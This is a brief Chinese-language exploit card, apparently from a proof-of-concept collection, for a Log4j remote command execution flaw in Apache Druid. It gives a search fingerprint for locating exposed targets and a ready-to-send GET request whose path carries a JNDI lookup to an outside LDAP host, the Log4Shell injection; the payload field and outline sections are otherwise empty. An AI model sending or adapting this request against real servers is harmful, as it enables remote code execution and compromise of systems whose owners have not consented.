# ApaceDruid存在Log4j远程命令执行漏洞

- **系统**：ApaceDruid　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="Apache Druid"`
- **请求**：`GET /druid/coordinator/v1/lookups/config/${jndi:ldap://pvibhhxnwt.dgrh3.cn} HTTP/1.1`
- **关键头**：`Content-Length: 995`

**请求体 / payload**
```
>
```

**其他**
- Apace Druid存在Log4j 远程命令执行漏洞: + 一、漏洞简介
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: + Apache Druid